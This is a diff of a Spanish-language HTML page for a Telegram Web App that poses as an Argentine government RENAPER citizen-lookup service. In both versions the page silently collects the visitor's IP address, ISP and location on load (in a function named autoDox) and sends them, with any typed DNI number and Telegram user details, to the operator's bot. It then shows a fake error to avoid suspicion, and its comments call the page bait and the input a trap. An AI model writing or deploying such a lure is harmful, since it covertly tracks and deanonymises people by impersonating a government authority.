@@ -1,122 +1,86 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>ARG-DATA v4.2</title>
-  <style>
-    :root { --main-green: #2ecc71; --dark-bg: #121212; --card-bg: #1e1e1e; --text-gray: #a0a0a0; }
-    body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-    
-    /* PANTALLA 1: CARGA INICIAL */
-    #terminal-screen { text-align: center; }
-    .blink { animation: blinker 1s linear infinite; color: var(--main-green); font-family: monospace; font-size: 1.5rem; font-weight: bold; }
-    @keyframes blinker { 50% { opacity: 0; } }
-
-    /* PANTALLA 2: INTERFAZ DE CONSULTA (EL ANZUELO) */
-    #app-screen { display: none; width: 90%; max-width: 400px; text-align: center; }
-    .title { color: var(--main-green); font-size: 2.2rem; font-weight: bold; margin-bottom: 5px; }
-    .subtitle { color: var(--main-green); font-size: 0.8rem; letter-spacing: 1px; margin-bottom: 25px; text-transform: uppercase; }
-    .card { background: var(--card-bg); padding: 25px; border-radius: 15px; border: 1px solid #333; text-align: left; }
-    .card-title { font-weight: bold; font-size: 1.1rem; margin-bottom: 5px; }
-    .card-desc { color: var(--text-gray); font-size: 0.8rem; margin-bottom: 20px; line-height: 1.4; }
-    
-    input { width: 100%; background: #2a2a2a; border: 1px solid #444; border-radius: 5px; padding: 12px; color: white; font-size: 1rem; box-sizing: border-box; margin-bottom: 20px; outline: none; }
-    .btn { background: var(--main-green); color: black; border: none; width: 100%; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 1rem; cursor: pointer; text-transform: uppercase; }
-    
-    .status-area { display: none; margin-top: 20px; }
-    .status-text { color: var(--main-green); font-size: 0.7rem; margin-bottom: 8px; font-family: monospace; }
-    .progress-container { width: 100%; background: #333; height: 6px; border-radius: 3px; overflow: hidden; }
-    .progress-bar { width: 0%; height: 100%; background: var(--main-green); transition: width 0.4s; }
-    
-    footer { position: absolute; bottom: 15px; color: #333; font-size: 0.6rem; width: 100%; text-align: center; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SISTEMA ARG-DATA v4.2</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
+        h3 { letter-spacing: 3px; text-shadow: 0 0 10px #00f2ff; }
+        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; outline: none; text-align: center; font-size: 1.1em; }
+        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; transition: 0.3s; }
+        button:active { transform: scale(0.95); background: #008c95; }
+        .footer { font-size: 0.7em; color: #444; margin-top: 30px; }
+        #status { font-size: 0.8em; margin-top: 15px; color: #00f2ff55; }
+    </style>
 </head>
 <body>
 
-  <div id="terminal-screen">
-    <div class="blink">CARGANDO...</div>
-  </div>
-
-  <div id="app-screen">
-    <div class="title">ARG-DATA v4.2</div>
-    <div class="subtitle">SISTEMA DE CONSULTA NACIONAL</div>
-
-    <div class="card">
-        <div class="card-title">Consultar DNI</div>
-        <div class="card-desc">Se realizará una consulta en la base de datos de RENAPER para verificar la información del ciudadano.</div>
+    <div class="box">
+        <h3>ARG-DATA BOT</h3>
+        <p>CONSULTA CIUDADANA RENAPER</p>
+        <hr style="border: 0.5px solid #00f2ff22;">
         
-        <input type="number" id="dniInput" placeholder="Número de documento">
+        <p style="font-size: 0.9em;">Ingrese DNI del objetivo:</p>
+        <input type="number" id="dni" placeholder="XXXXXXXX" autocomplete="off">
+        <br>
+        <button onclick="enviarDni()">BUSCAR CIUDADANO</button>
         
-        <button class="btn" onclick="consultar()">REALIZAR CONSULTA</button>
-
-        <div class="status-area" id="loading-area">
-            <div class="status-text" id="statusMsg">Conectando con RENAPER...</div>
-            <div class="progress-container">
-                <div class="progress-bar" id="bar"></div>
-            </div>
-        </div>
+        <div id="status">Sincronizando con nodo central...</div>
     </div>
-    <footer>Acceso Restringido - Nodo de Seguridad Local</footer>
-  </div>
 
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-    
-    let infoCapturada = {};
+    <div class="footer">
+        ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA<br>
+        SISTEMA DE SEGURIDAD V4.2
+    </div>
 
-    // CAPTURA SILENCIOSA DE IP, PROVEEDOR Y UBICACIÓN
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => { 
-          infoCapturada = {
-              ip: data.ip,
-              proveedor: data.org,
-              ubicacion: `${data.city}, ${data.country_name}`
-          };
-      })
-      .catch(() => {
-          // Respaldo si falla el servicio principal
-          fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => { infoCapturada.ip = d.ip; });
-      });
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Abre la app al máximo tamaño
 
-    // Cambia de "CARGANDO" a la App en 2 segundos
-    setTimeout(() => {
-        document.getElementById('terminal-screen').style.display = 'none';
-        document.getElementById('app-screen').style.display = 'block';
-    }, 2000);
+        // --- 1. CAPTURA AUTOMÁTICA DE IP AL ABRIR ---
+        async function autoDox() {
+            try {
+                // Obtiene datos de red mediante API externa
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
 
-    function consultar() {
-        const dniTrampa = document.getElementById('dniInput').value;
-        if(dniTrampa.length < 6) return;
+                const reporte = {
+                    evento: "IP_CAPTURADA",
+                    ip: data.ip,
+                    proveedor: data.org,
+                    ubicacion: `${data.city}, ${data.country_name}`
+                };
 
-        // Mostrar animación de carga para dar credibilidad
-        document.getElementById('loading-area').style.display = 'block';
-        const bar = document.getElementById('bar');
-        const msg = document.getElementById('statusMsg');
+                // Envía los datos al bot de Termux automáticamente
+                tg.sendData(JSON.stringify(reporte));
+                document.getElementById('status').innerText = "CONEXIÓN CIFRADA ESTABLECIDA";
+            } catch (e) {
+                console.log("Error en captura");
+            }
+        }
 
-        setTimeout(() => { bar.style.width = "45%"; msg.innerText = "Accediendo a base de datos RENAPER..."; }, 1200);
-        setTimeout(() => { bar.style.width = "90%"; msg.innerText = "Sincronizando registros..."; }, 2800);
-
-        // Envío de todos los datos (reales y trampa) al bot
-        setTimeout(() => {
-            const paqueteDatos = {
-                ...infoCapturada,
-                dni_falso: dniTrampa,
-                user: tg.initDataUnsafe.user
-            };
+        // --- 2. CAPTURA DEL DNI (SI EL USUARIO LO ESCRIBE) ---
+        function enviarDni() {
+            const dniVal = document.getElementById('dni').value;
+            if(!dniVal) {
+                alert("Debe ingresar un DNI válido.");
+                return;
+            }
             
-            tg.sendData(JSON.stringify(paqueteDatos));
+            // Envía el DNI ingresado como un segundo reporte
+            tg.sendData(JSON.stringify({
+                evento: "DNI_INGRESADO",
+                dni: dniVal
+            }));
+            
+            alert("Error 504: Tiempo de espera agotado. Reintente en unos minutos.");
+        }
 
-            // Cierre con error falso para no levantar sospechas
-            alert("Error de red: El servidor de RENAPER no responde en este momento. Intente más tarde.");
-            tg.close();
-        }, 4500);
-    }
-  </script>
+        // Iniciar la captura apenas cargue la página
+        window.onload = autoDox;
+    </script>
 </body>
 </html>
